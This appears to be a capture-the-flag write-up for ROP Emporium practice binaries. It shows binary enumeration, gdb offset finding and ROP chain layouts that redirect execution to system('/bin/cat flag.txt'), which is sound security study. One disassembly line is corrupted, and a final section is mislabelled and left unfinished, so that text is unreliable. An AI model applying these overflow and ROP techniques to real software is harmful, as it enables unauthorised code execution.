## [ROP Emporium](https://ropemporium.com/)

### Table of Contents


### [ret2win](ret2win/ret2win.py)

**Enumeration**

```
$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped

$ checksec --file ret2win
[*] 'ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ nm ret2win | grep ' t'
00000000004005f0 t deregister_tm_clones
0000000000400660 t __do_global_dtors_aux
0000000000400690 t frame_dummy
00000000004006e8 t pwnme
0000000000400620 t register_tm_clones
0000000000400756 t ret2win

$ rabin2 -i ret2win
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00400550 GLOBAL FUNC       puts
2   0x00400560 GLOBAL FUNC       system
3   0x00400570 GLOBAL FUNC       printf
4   0x00400580 GLOBAL FUNC       memset
5   0x00400590 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00000000 WEAK   NOTYPE     __gmon_start__
8   0x004005a0 GLOBAL FUNC       setvbuf

```
The binary is vulnerable and has NX enabled so ROPChains are the way. The binary has interesting functions `pwnme` and `ret2win`. It also makes calls to system, puts, read, memset, and setvbuf which could be used. Disassembling it in GDB, pwnme seems to be the main functionality with the read function while ret2win is a function that prints the flag. So calling the ret2win function should successfully complete this challenge meaning all we need to do is push the address of that function at eip.

**Exploiting**

Running gdb-gef:
```
gef➤  pattern create 50
[+] Generating a pattern of 50 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
gef➤  run
...
0x00007fffffffdea8│+0x0000: "faaaaaaaga\n"	 ← $rsp
...
gef➤  pattern search faaaaaaaga
[+] Searching for '61676161616161616166'/'66616161616161616761' with period=8
[+] Found at offset 40 (big-endian search)
```

What is ret2win:
```
gef➤  disass ret2win
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:	push   rbp
   0x0000000000400757 <+1>:	mov    rbp,rsp
   0x000000000040075a <+4>:	mov    edi,0x400926
   0x000000000040075f <+9>:	call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:	mov    edi,0x400943
   0x0000000000400769 <+19>:	call   0x400560 <system@plt>
   0x000000000040076e <+24>:	nop
   0x000000000040076f <+25>:	pop    rbp
   0x0000000000400770 <+26>:	ret    
```
By overflowingg 40 bytes, and then putting the address for the function `ret2win`, we can now print the flag.

**NOTE**: Needed to add a `ret` instruction for padding to solve the MOVAPS issue:

> If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.

### [split](split/split.py)

**Enumeration**

```
$ file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped

$ checksec --file split
[*] '/home/z3r0/Documents/coder/ROPChains/emporium/split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ nm split
...
0000000000400697 T main
                 U memset@@GLIBC_2.2.5
                 U printf@@GLIBC_2.2.5
                 U puts@@GLIBC_2.2.5
00000000004006e8 t pwnme
                 U read@@GLIBC_2.2.5
...
0000000000400742 t usefulFunction
0000000000601060 D usefulString

$ rabin2 -z split
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
...
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```
Looking at the binary really quickly, there is a function called `usefulFunction` and a global string called `usefulString`. Disassembling can definitely show what the function does and where to go from there. By printing the strings found in the binary, it shows the `/bin/cat flag.txt` string at the adress of usefulString.

**Exploiting**

What is usefulFunction:
```
gef➤  disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:	push   rbp
   0x0000000000400743 <+1>:	mov    rbp,rsp
   0x0000000000400746 <+4>:	mov    edi,0xrpg rd40084a
   0x000000000040074b <+9>:	call   0x400560 <system@plt>
   0x0000000000400750 <+14>:	nop
   0x0000000000400751 <+15>:	pop    rbp
   0x0000000000400752 <+16>:	ret 
```
Disassembling the function shows a call to `<system@plt>` which is exactly what was expected. Since there is a string that prints the flag and the system call, a ROP chain can be created to call `system("/bin/cat flag.txt")`. The stack should look like the following for the rop chain to happen:
```
---TOP---
POP RDI
USEFULSTRING
SYSTEM
---BOT---
```
When the overflow happens the next call will be the first instruction on the stack. For a system call to succeed, it needs one argument. The first argument is $rdi, so before the system call, a `pop rdi`instruction must be made to prepare the string into $rdi. Adding this to the payload will result in printing the string.

### [callme](callme/callme.py)

**Enumeration**

```
$ rabin2 -i callme
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
<summary>
3   0x004006f0 GLOBAL FUNC       callme_three
7   0x00400720 GLOBAL FUNC       callme_one
10  0x00400740 GLOBAL FUNC       callme_two

$ rabin2 -R callme
[Relocations]
vaddr      paddr      type   name
―――――――――――――――――――――――――――――――――
<summary>
0x00601028 0x00001028 SET_64 callme_three
0x00601040 0x00001040 SET_64 callme_one
0x00601050 0x00001050 SET_64 callme_two

$ rabin2 -z callme
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000009c8 0x004009c8 22  23   .rodata ascii callme by ROP Emporium
1   0x000009df 0x004009df 7   8    .rodata ascii x86_64\n
2   0x000009e7 0x004009e7 8   9    .rodata ascii \nExiting
3   0x000009f0 0x004009f0 34  35   .rodata ascii Hope you read the instructions...\n
4   0x00000a16 0x00400a16 10  11   .rodata ascii Thank you!
```
Instructions state the following:
> You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d).
Using this, order the ROP chain to make calls to these functions.

**Exploiting**

Taking a closer look at those three special functions show:
```
gef➤  disass callme_one
Dump of assembler code for function callme_one@plt:
   0x0000000000400720 <+0>:   jmp    QWORD PTR [rip+0x20091a]        # 0x601040 <callme_one@got.plt>
   0x0000000000400726 <+6>:   push   0x5
   0x000000000040072b <+11>:  jmp    0x4006c0
End of assembler dump.
gef➤  disass callme_two
Dump of assembler code for function callme_two@plt:
   0x0000000000400740 <+0>:   jmp    QWORD PTR [rip+0x20090a]        # 0x601050 <callme_two@got.plt>
   0x0000000000400746 <+6>:   push   0x7
   0x000000000040074b <+11>:  jmp    0x4006c0
End of assembler dump.
gef➤  disass callme_three
Dump of assembler code for function callme_three@plt:
   0x00000000004006f0 <+0>:   jmp    QWORD PTR [rip+0x200932]        # 0x601028 <callme_three@got.plt>
   0x00000000004006f6 <+6>:   push   0x2
   0x00000000004006fb <+11>:  jmp    0x4006c0
```
Each function pushes its .got.plt entry's offset, then jmps to the head of the .plt. The push; jmp; at the head of the .plt pushes the 2nd entry of the .got.plt, which is the address of the linkmap head, then jmps to the 3rd entry: a resolved function named.

To create the ROP chain, get gadgets for the first three arguments $rdi, $rsi, $rdx. Luckily, when using the ropper tool, there is a gadget to pop all three of those in order `pop rdi; pop rsi; pop rdx; ret;` at location 0x40093c. Follow that up with the correct arguments to validate the callme functions and then the actual calls to callme_one, callme_two, and callme_three. Each time a call to one of the *callme* functions is made, the args will have to be repopulated because of modifcation during the previous *callme* function.

### [callme](callme/callme.py)

**Enumeration**

In gdb (gef):

```
gef➤  info fun
...
0x0000000000400500  pwnme@plt > function for input
0x0000000000400510  print_file@plt > prints
0x0000000000400607  main > has pwnme
0x0000000000400617  usefulFunction > calls print_file
0x0000000000400628  usefulGadgets > gadget to push r15 r14 and modify rax
...
```

**Exploiting**


### Tools

#### ropper
Standalone ROP gadget finder written in Python, displays useful information about binary files. It has coloured output, interactive search and supports bad character lists.

#### ROPGadget
Another powerful ROP gadget finder, doesn't have the interactive search or colourful output that ropper features but it has stronger gadget detection when it comes to ARM architecture.

#### pwntools
CTF framework written in Python. Simplifies interaction with local and remote binaries which makes testing ROP chains on a target a lot easier. Supports a multitude of debugging and execution functions.

#### radare2
Tool radare2 is a disassembler, debugger and binary analysis tool amongst many other things. It is a powerful took that can be used to quickly find information on target binaries.

#### pwndbg
Built as a successor to frameworks like PEDA and GEF, pwndbg is a plugin for GDB that greatly enhances its exploit development capability. Makes it much easier to undestand an environment when debugging.